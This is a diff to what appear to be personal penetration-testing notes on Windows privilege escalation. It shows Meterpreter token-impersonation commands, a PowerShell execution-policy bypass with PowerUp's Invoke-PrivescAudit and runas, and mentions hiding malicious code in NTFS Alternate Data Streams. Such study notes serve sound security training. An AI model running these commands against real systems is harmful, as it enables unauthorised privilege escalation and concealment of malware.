@@ -186,12 +186,19 @@ migarte ps_num #pick nt authorithy
 + 
 ```
 getprivs #setting we want to see setimpersonateprivliage
-load incagnito
+load incognito
 list_tokens -u
 impersonate_token "NAMEOFTOKEN"
 migrate 3512
 ```
+## Powershell 
+```
+powershell -ep bypass (PowerShell execution policy bypass)
+..\PowerUp.ps1
+Invoke-PrivescAudit
 
+runas.exe /user:username cmd
+```
 ## Alternate Data Streams 
 + ADS ia an NTFS file attributes 
 + THis can be done by storing the malicouse code or exectuable in the file attribute resource stream
